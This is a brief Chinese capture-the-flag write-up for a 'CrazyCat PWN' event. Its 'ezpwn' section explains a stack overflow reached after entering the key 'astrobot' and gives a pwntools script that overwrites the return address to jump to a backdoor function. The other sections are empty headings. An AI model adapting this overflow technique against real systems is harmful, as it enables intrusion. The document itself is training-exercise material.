CrazyCat PWN

# Day1
## ezpwn
![[Pasted image 20250210232353.png]]
输入的值与DAT_00405068一样后便可以栈溢出。
![[Pasted image 20250210232500.png]]
答案是年度最佳astrobot。
![[Pasted image 20250210232539.png]]
可以找到backdoors，构造payload即可。
exp:
```python
from pwn import *

from wstube import websocket

  

context(arch='amd64', os='linux', log_level='debug')

local = True

if local:

p = process('./ezpwn')

else:

p = websocket('ws://ctf.miaoaixuan.cn/api/proxy/0194eda1-f812-771e-9167-d804f8f8a76f')

  

ret = 0x40101a

backdoors = 0x401539

key = b'astrobot'

p.recvuntil(b'\x21\x0a')

p.send(key)

p.recvuntil(b'something:')

payload = b'A' * 0x58 + p64(ret) + p64(backdoors)

p.sendline(payload)

p.interactive()
```
## fmt_str

## shellcode

## walt改造的编译器
